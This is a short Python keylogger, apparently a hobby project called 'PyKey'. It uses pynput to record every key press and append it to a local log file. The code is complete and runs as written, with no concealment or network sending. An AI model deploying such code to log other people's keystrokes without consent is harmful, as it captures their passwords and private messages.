from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")
    
    if letter == 'Key.space':
        letter = ''
    if letter == 'Key.ctrl':
        letter = ' CTRL ' 
    if letter == 'Key.shift':
        letter = ' SHIFT '
    if letter == 'Key.caps_lock':
        letter = ' CAPSLOCK '
    if letter == 'Key.backspace':   
        letter = '\b'
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.left':
        letter = ' <-- '
    if letter == 'Key.right':
        letter = ' --> '
    if letter == 'Key.up':
        letter = ' ^(up) ' 
    if letter == 'Key.down':
        letter = ' v(down) '
    if letter == 'Key.alt':
        letter = ' ALT '
    if letter == 'Key.esc':
        letter = ' ESC '
    if letter == 'Key.delete':
        letter = ' DELETE '
    # print(letter)     # If you want to print results in terminal.
    with open('/home/fibonnaci/Documents/Python/Python Projects/PyKey/log.txt', 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()